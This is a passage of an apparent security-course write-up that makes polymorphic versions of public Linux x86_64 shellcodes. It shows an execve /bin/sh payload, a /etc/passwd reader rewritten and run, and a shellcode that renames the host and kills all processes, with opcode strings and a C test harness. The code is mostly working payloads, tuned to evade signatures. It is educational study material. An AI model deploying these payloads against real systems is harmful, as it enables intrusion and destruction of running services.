+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xf6\x48\xf7\xe6\x49\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe9\x08\x4c\x89\x4c\x24\xf8\x48\x8d\x7c\x24\xf8\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>edu
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p><strong>Size: 42 bytes</strong></p>
+<p>Increased 1 byte which is more <code>2,4%</code> in size compared to the original.</p>
+<h2 id="shellcode-2---read-etcpasswd">Shellcode 2 - Read /etc/passwd<a hidden class="anchor" aria-hidden="true" href="#shellcode-2---read-etcpasswd">#</a></h2>
+<p>This shellcode was written by <code>Mr.Un1k0d3r</code>, and is located <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.html">here</a>. This shellcode reads the <code>/etc/passwd</code> file to stdout.</p>
+<p><strong>Size: 82 bytes</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; Author Mr.Un1k0d3r - RingZer0 Team
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Read /etc/passwd Linux x86_64 Shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Shellcode size 82 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">_push_filename</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>_readfile:
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall open file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rdi</span> <span style="color:#75715e">; pop path value
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; NULL byte fix
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rdi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">11</span>], <span style="color:#ae81ff">0x41</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span> <span style="color:#75715e">; set O_RDONLY flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall read file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">sp</span>, <span style="color:#ae81ff">0xfff</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rsp</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dx</span>, <span style="color:#ae81ff">0xfff</span><span style="color:#75715e">; size to read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall write to stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">dil</span>, <span style="color:#ae81ff">1</span> <span style="color:#75715e">; set stdout fd = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall exit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">60</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>_push_filename:
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">_readfile</span>
+</span></span><span style="display:flex;"><span>path: <span style="color:#a6e22e">db</span> <span style="color:#960050;background-color:#1e0010">&#34;/</span><span style="color:#66d9ef">etc</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">passwdA</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
+</span></span></code></pre></div><p>The shellcode has some tricks to use less space but we can be even more &ldquo;space friendly&rdquo;. In comments we have the instructions that were changed and below their polymorphic version.</p>
+<h3 id="polymorphic-version-1">Polymorphic Version<a hidden class="anchor" aria-hidden="true" href="#polymorphic-version-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">_readfile</span>
+</span></span><span style="display:flex;"><span>path: <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x64</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>_readfile:
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall open file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;pop rdi ; pop path value
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, [<span style="color:#66d9ef">rel</span> <span style="color:#66d9ef">path</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; NULL byte fix
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;xor byte [rdi + 11], 0x41
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">shr</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">11</span>], <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">;xor rax, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;add al, 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span> <span style="color:#75715e">; set O_RDONLY flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall read file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">sp</span>, <span style="color:#ae81ff">0xfff</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rsp</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dx</span>, <span style="color:#ae81ff">0xfff</span><span style="color:#75715e">; size to read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall write to stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x1</span>   <span style="color:#75715e">; set stdout fd = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; syscall exit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">60</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../assembler.sh poly_read_passwd.nasm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">70</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x0b\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x48\x8d\x3d\xee\xff\xff\xff\xc0\x6f\x0b\x08\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\x99\x66\xba\xff\x0f\x0f\x05\x6a\x01\x5f\x48\x89\xc2\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x48\x8d\x3d\xee\xff\xff\xff\xc0\x6f\x0b\x08\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\x99\x66\xba\xff\x0f\x0f\x05\x6a\x01\x5f\x48\x89\xc2\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">70</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/usr/bin/zsh
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span></span><span style="display:flex;"><span>avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>saned:x:111:120::/var/lib/saned:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span></span><span style="display:flex;"><span>lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh
+</span></span></code></pre></div><p><strong>Size: 70 bytes</strong></p>
+<p>Reduced 12 bytes!!! This is a reduction of <code>14,6%</code> in size compared to the original.</p>
+<blockquote>
+<p>I&rsquo;ve made the same exercise for the <a href="/posts/slae_32_assignment_6/#shellcode-2---cat-passwd-shellcode">32bit</a> version but I only could increase the code size. Having in the 64bit version less 14,6% is a real great achievement for me.</p>
+</blockquote>
+<h2 id="shellcode-3---sethostname--killall">Shellcode 3 - setHostname() &amp; killall<a hidden class="anchor" aria-hidden="true" href="#shellcode-3---sethostname--killall">#</a></h2>
+<p>This shellcode was written by <code>zbt</code>, and is located <a href="http://www.shell-storm.org/shellcode/files/shellcode-605.html">here</a>. This shellcode sets the hostname to &ldquo;Rooted !&rdquo; and kills all the processes.</p>
+<p><strong>Size: 33 bytes</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sethostname(&#34;Rooted !&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; kill(-1, SIGKILL);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    _start:
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">;-- setHostName(&#34;Rooted !&#34;); 22 bytes --;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xaa</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">r8</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">Rooted</span> !<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">r8</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">sil</span>, <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">;-- kill(-1, SIGKILL); 11 bytes --;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x3e</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pop</span>     <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0xff</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pop</span>     <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x9</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pop</span>     <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Simple short shellcode without many room for improvements.</p>
+<h3 id="polymorphic-version-2">Polymorphic Version<a hidden class="anchor" aria-hidden="true" href="#polymorphic-version-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; sethostname(&#34;Rooted !&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; kill(-1, SIGKILL);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">;-- setHostName(&#34;Rooted !&#34;); 22 bytes --;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>sethostname:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>		<span style="color:#75715e">; zeroing out rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span>     <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span>	    <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xaa</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span>	    <span style="color:#66d9ef">r9</span>, <span style="color:#ae81ff">0x21206465746F6F52</span>	<span style="color:#75715e">; Rooted !
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">r9</span>			
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">mov</span>     <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>		
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">add</span>     <span style="color:#66d9ef">sil</span>, <span style="color:#ae81ff">0x8</span>		<span style="color:#75715e">; and subing it down to 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">;-- kill(-1, SIGKILL); 11 bytes --;
